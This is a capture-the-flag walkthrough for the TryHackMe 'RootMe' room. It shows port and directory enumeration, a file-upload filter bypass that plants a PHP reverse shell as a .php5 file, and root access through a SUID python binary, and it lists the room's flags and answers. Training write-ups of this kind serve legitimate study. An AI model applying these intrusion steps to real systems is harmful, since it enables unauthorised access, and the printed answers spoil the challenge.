---
tags:
  - tryhackme
  - challenge
  - easy
  - offensive
  - suid-abuse
---

# RootMe
![RootMe logo](logos/rootme_logo.png)

**Platform:** TryHackMe  
**Type:** Challenge  
**Difficulty:** Easy  
**Link:** [RootMe](https://tryhackme.com/room/rrootme)  

## Description
"A ctf for beginners, can you root me?"

## Enumeration
### Port Scanning
```
ports=$(nmap -p- --min-rate=1000 TARGET_IP_ADDRESS | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -A -T4 TARGET_IP_ADDRESS
```

```
Host is up (0.020s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 72:38:39:73:e0:4b:e8:bd:b9:19:0d:66:17:7b:66:34 (RSA)
|   256 43:a2:24:5d:81:e9:93:5d:af:37:f3:af:09:29:e0:be (ECDSA)
|_  256 44:ec:07:df:2d:94:b8:86:b3:5b:84:45:df:29:4b:a8 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: HackIT - Home
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (96%), Google Android 10.X|11.X|12.X (93%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:google:android:10 cpe:/o:google:android:11 cpe:/o:google:android:12 cpe:/o:linux:linux_kernel:5.4 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel:3
Aggressive OS guesses: Linux 4.15 - 5.19 (96%), Linux 4.15 (95%), Linux 5.4 (95%), Android 10 - 12 (Linux 4.14 - 4.19) (93%), Android 10 - 11 (Linux 4.14) (92%), Android 9 - 10 (Linux 4.9 - 4.14) (92%), Android 12 (Linux 5.4) (92%), Linux 2.6.32 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
??? success "Scan the machine, how many ports are open?"
	2
??? success "What version of Apache is running?"
	2.4.41
??? success "What service is running on port 22?"
	SSH

### HTTP Enumeration
```
ffuf -u http://TARGET_IP_ADDRESS/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -c
gobuster dir -u TARGET_IP_ADDRESS -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,html,txt
```

**Notes**  

* No `robots.txt` or `sitemap` files  
* Nothing interesting in the source code  
* `ffuf` scan reveals `/uploads` directory: no contents  
* `ffuf` scan reveals `/css` directory: no interesting contents  
* `ffuf` scan reveals `/js` directory: no interesting contents  
*  `ffuf` scan reveals `/panel` directory: nothing interesting in the source code; page reveals POST form for uploading files  
*  Uploading test document shows file saved with original file name in `/uploads` directory  
??? success "What is the hidden directory?"
	/panel/

### Vulnerability Enumeration
```
searchsploit OpenSSH 8.2p1	# No results
searchsploit httpd 2.4.41	# Only result: DoS
```

## Foothold
**Action(s)**  
:white_check_mark: Upload [php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)  
*Upload fails - "PHP files are forbidden"*  
:white_check_mark: Upload php-reverse-shell as .php5 file  
*Upload succeeds and executes as a shell on navigating through `/uploads` directory with `nc` listener initiated on attacker machine*  

```
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ip-10-130-158-241:/$ find / -name user.txt 2>/dev/null
find / -name user.txt 2>/dev/null
/var/www/user.txt
www-data@ip-10-130-158-241:/$ cat /www/user.txt
```
??? success "user.txt"
	THM{y0u_g0t_a_sh3ll}

## Privilege Escalation
```
www-data@ip-10-130-158-241:/$ find / -perm -4000 -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
# <OMITTED FOR BREVITY>
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python2.7
/usr/bin/at
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
# <OMITTED FOR BREVITY>
```
??? success "Search for files with SUID permission, which file is weird?"
	/usr/bin/python

[GTFObins for `python`](https://gtfobins.org/gtfobins/python/)  

```
www-data@ip-10-130-158-241:/$ python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
<2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
root: ls -al /root
ls -al /root
total 44
drwx------  7 root root 4096 Aug 10  2025 .
drwxr-xr-x 24 root root 4096 Apr 27 20:00 ..
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 Aug  4  2020 .cache
drwx------  3 root root 4096 Aug  4  2020 .gnupg
drwxr-xr-x  3 root root 4096 Aug  4  2020 .local
-rw-r--r--  1 root root  161 Jan  2  2024 .profile
drwx------  2 root root 4096 Aug 10  2025 .ssh
-rw-------  1 root root 2122 Aug 10  2025 .viminfo
-rw-r--r--  1 root root   26 Aug  4  2020 root.txt
drwx------  3 root root 4096 Aug 10  2025 snap
root: cat /root/root.txt
```
??? success "root.txt"
	THM{pr1v1l3g3_3sc4l4t10n}

**Date completed:** 27/04/26  
**Date published:** 27/04/26